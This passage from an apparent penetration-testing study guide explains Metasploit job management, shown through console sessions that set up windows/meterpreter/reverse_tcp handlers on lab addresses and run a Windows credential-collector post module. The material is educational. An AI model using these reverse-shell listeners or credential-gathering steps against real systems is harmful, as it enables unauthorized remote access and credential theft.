msf6 post(windows/gather/credentials/credential_collector) &gt; set SESSION 1
SESSION =&gt; 1

# Run the module
msf6 post(windows/gather/credentials/credential_collector) &gt; run
</code></pre>
<hr>
<h2 id="jobs"><a class="header" href="#jobs">Jobs</a></h2>
<p>If, for example, we are running an active exploit under a specific port and need this port for a different module, we cannot simply terminate the session using <code>[CTRL] + [C]</code>. If we did that, we would see that the port would still be in use, affecting our use of the new module.</p>
<p>Instead, we need to use the <code>jobs</code> command to look at the currently active tasks running in the background and terminate the old ones to free up the port.</p>
<p>Other types of tasks inside sessions can also be converted into jobs to run in the background seamlessly, even if the session dies or disappears.</p>
<h3 id="jobs-command-help-menu"><a class="header" href="#jobs-command-help-menu">Jobs Command Help Menu</a></h3>
<pre><code class="language-bash">msf6 exploit(multi/handler) &gt; jobs -h
Usage: jobs [options]

Active job manipulation and interaction.

OPTIONS:

    -K        Terminate all running jobs.
    -P        Persist all running jobs on restart.
    -S &lt;opt&gt;  Row search filter.
    -h        Help banner.
    -i &lt;opt&gt;  Lists detailed information about a running job.
    -k &lt;opt&gt;  Terminate jobs by job ID and/or range.
    -l        List all running jobs.
    -p &lt;opt&gt;  Add persistence to job by job ID
    -v        Print more detailed info.  Use with -i and -l
</code></pre>
<h3 id="exploit-command-help-menu"><a class="header" href="#exploit-command-help-menu">Exploit Command Help Menu</a></h3>
<p>When we run an exploit, we can run it as a job by typing <code>exploit -j</code>. Per the help menu, adding <code>-j</code> to our command will ‚Äúrun it in the context of a job.‚Äù</p>
<pre><code class="language-bash">msf6 exploit(multi/handler) &gt; exploit -h
Usage: exploit [options]

Launches an exploitation attempt.

OPTIONS:

    -J        Force running in the foreground, even if passive.
    -e &lt;opt&gt;  The payload encoder to use.  If none is specified, ENCODER is used.
    -f        Force the exploit to run regardless of the value of MinimumRank.
    -h        Help banner.
    -j        Run in the context of a job.
    -z        Do not interact with the session after successful exploitation.
</code></pre>
<h3 id="running-an-exploit-as-a-background-job"><a class="header" href="#running-an-exploit-as-a-background-job">Running an Exploit as a Background Job</a></h3>
<pre><code class="language-bash">msf6 exploit(multi/handler) &gt; exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.34:4444
</code></pre>
<h3 id="listing-running-jobs"><a class="header" href="#listing-running-jobs">Listing Running Jobs</a></h3>
<p>To list all running jobs, use the <code>jobs -l</code> command:</p>
<pre><code class="language-bash">msf6 &gt; jobs -l

Jobs
====

  Id  Name                    Payload                          Payload opts
  --  ----                    -------                          ------------
  0   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://10.10.14.34:4444
</code></pre>
<h3 id="managing-jobs"><a class="header" href="#managing-jobs">Managing Jobs</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Command</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>jobs -l</code></td><td>List all running jobs</td></tr>
<tr><td><code>jobs -i &lt;id&gt;</code></td><td>Show detailed information about a job</td></tr>
<tr><td><code>jobs -k &lt;id&gt;</code></td><td>Kill a specific job by ID</td></tr>
<tr><td><code>jobs -K</code></td><td>Kill all running jobs</td></tr>
<tr><td><code>kill &lt;index no.&gt;</code></td><td>Kill job by index number</td></tr>
</tbody>
</table>
</div>
<h3 id="example-multiple-handlers-workflow"><a class="header" href="#example-multiple-handlers-workflow">Example: Multiple Handlers Workflow</a></h3>
<pre><code class="language-bash"># Configure first handler
msf6 &gt; use exploit/multi/handler
msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) &gt; set LHOST 10.10.14.34
msf6 exploit(multi/handler) &gt; set LPORT 4444

# Run as background job
msf6 exploit(multi/handler) &gt; exploit -j
[*] Exploit running as background job 0.
[*] Started reverse TCP handler on 10.10.14.34:4444

# Configure second handler on different port
msf6 exploit(multi/handler) &gt; set LPORT 4445
msf6 exploit(multi/handler) &gt; exploit -j
[*] Exploit running as background job 1.
[*] Started reverse TCP handler on 10.10.14.34:4445

# List all jobs
msf6 &gt; jobs -l

Jobs
====

  Id  Name                    Payload                          Payload opts
  --  ----                    -------                          ------------
  0   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://10.10.14.34:4444
  1   Exploit: multi/handler  windows/meterpreter/reverse_tcp  tcp://10.10.14.34:4445

# Kill specific job to free port
msf6 &gt; jobs -k 0
[*] Stopping the following job(s): 0

# Kill all jobs
msf6 &gt; jobs -K
[*] Stopping all jobs...
</code></pre>
<p><strong>Important:</strong> Using <code>[CTRL] + [C]</code> to stop an exploit will not properly release the port. Always use <code>jobs -k &lt;id&gt;</code> to terminate jobs and free up ports correctly.</p>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../tools/hashcat.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M41.4 233.4c-12.5 12.5-12.5 32.8 0 45.3l160 160c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L109.3 256 246.6 118.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0l-160 160z"/></svg></span>
                            </a>

                            <a rel="next prefetch" href="../troubleshooting/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z"/></svg></span>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../tools/hashcat.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M41.4 233.4c-12.5 12.5-12.5 32.8 0 45.3l160 160c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L109.3 256 246.6 118.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0l-160 160z"/></svg></span>
                    </a>

                    <a rel="next prefetch" href="../troubleshooting/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z"/></svg></span>
                    </a>
            </nav>

        </div>

        <template id=fa-eye><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M288 32c-80.8 0-145.5 36.8-192.6 80.6C48.6 156 17.3 208 2.5 243.7c-3.3 7.9-3.3 16.7 0 24.6C17.3 304 48.6 356 95.4 399.4C142.5 443.2 207.2 480 288 480s145.5-36.8 192.6-80.6c46.8-43.5 78.1-95.4 93-131.1c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C433.5 68.8 368.8 32 288 32zM432 256c0 79.5-64.5 144-144 144s-144-64.5-144-144s64.5-144 144-144s144 64.5 144 144zM288 192c0 35.3-28.7 64-64 64c-11.5 0-22.3-3-31.6-8.4c-.2 2.8-.4 5.5-.4 8.4c0 53 43 96 96 96s96-43 96-96s-43-96-96-96c-2.8 0-5.6 .1-8.4 .4c5.3 9.3 8.4 20.1 8.4 31.6z"/></svg></span></template>
        <template id=fa-eye-slash><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M38.8 5.1C28.4-3.1 13.3-1.2 5.1 9.2S-1.2 34.7 9.2 42.9l592 464c10.4 8.2 25.5 6.3 33.7-4.1s6.3-25.5-4.1-33.7L525.6 386.7c39.6-40.6 66.4-86.1 79.9-118.4c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C465.5 68.8 400.8 32 320 32c-68.2 0-125 26.3-169.3 60.8L38.8 5.1zM223.1 149.5C248.6 126.2 282.7 112 320 112c79.5 0 144 64.5 144 144c0 24.9-6.3 48.3-17.4 68.7L408 294.5c5.2-11.8 8-24.8 8-38.5c0-53-43-96-96-96c-2.8 0-5.6 .1-8.4 .4c5.3 9.3 8.4 20.1 8.4 31.6c0 10.2-2.4 19.8-6.6 28.3l-90.3-70.8zm223.1 298L373 389.9c-16.4 6.5-34.3 10.1-53 10.1c-79.5 0-144-64.5-144-144c0-6.9 .5-13.6 1.4-20.2L83.1 161.5C60.3 191.2 44 220.8 34.5 243.7c-3.3 7.9-3.3 16.7 0 24.6c14.9 35.7 46.2 87.7 93 131.1C174.5 443.2 239.2 480 320 480c47.8 0 89.9-12.9 126.2-32.5z"/></svg></span></template>
        <template id=fa-copy><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M502.6 70.63l-61.25-61.25C435.4 3.371 427.2 0 418.7 0H255.1c-35.35 0-64 28.66-64 64l.0195 256C192 355.4 220.7 384 256 384h192c35.2 0 64-28.8 64-64V93.25C512 84.77 508.6 76.63 502.6 70.63zM464 320c0 8.836-7.164 16-16 16H255.1c-8.838 0-16-7.164-16-16L239.1 64.13c0-8.836 7.164-16 16-16h128L384 96c0 17.67 14.33 32 32 32h47.1V320zM272 448c0 8.836-7.164 16-16 16H63.1c-8.838 0-16-7.164-16-16L47.98 192.1c0-8.836 7.164-16 16-16H160V128H63.99c-35.35 0-64 28.65-64 64l.0098 256C.002 483.3 28.66 512 64 512h192c35.2 0 64-28.8 64-64v-32h-47.1L272 448z"/></svg></span></template>
        <template id=fa-play><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M73 39c-14.8-9.1-33.4-9.4-48.5-.9S0 62.6 0 80V432c0 17.4 9.4 33.4 24.5 41.9s33.7 8.1 48.5-.9L361 297c14.3-8.7 23-24.2 23-41s-8.7-32.2-23-41L73 39z"/></svg></span></template>
        <template id=fa-clock-rotate-left><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M75 75L41 41C25.9 25.9 0 36.6 0 57.9V168c0 13.3 10.7 24 24 24H134.1c21.4 0 32.1-25.9 17-41l-30.8-30.8C155 85.5 203 64 256 64c106 0 192 86 192 192s-86 192-192 192c-40.8 0-78.6-12.7-109.7-34.4c-14.5-10.1-34.4-6.6-44.6 7.9s-6.6 34.4 7.9 44.6C151.2 495 201.7 512 256 512c141.4 0 256-114.6 256-256S397.4 0 256 0C185.3 0 121.3 28.7 75 75zm181 53c-13.3 0-24 10.7-24 24V256c0 6.4 2.5 12.5 7 17l72 72c9.4 9.4 24.6 9.4 33.9 0s9.4-24.6 0-33.9l-65-65V152c0-13.3-10.7-24-24-24z"/></svg></span></template>



        <script>
            window.playground_copyable = true;
        </script>


        <script src="../elasticlunr-ef4e11c1.min.js"></script>
        <script src="../mark-09e88c2c.min.js"></script>
        <script src="../searcher-c2a407aa.js"></script>

        <script src="../clipboard-1626706a.min.js"></script>
        <script src="../highlight-abc7f01d.js"></script>
        <script src="../book-a0b12cfe.js"></script>

        <!-- Custom JS scripts -->



    </div>
    </body>
</html>
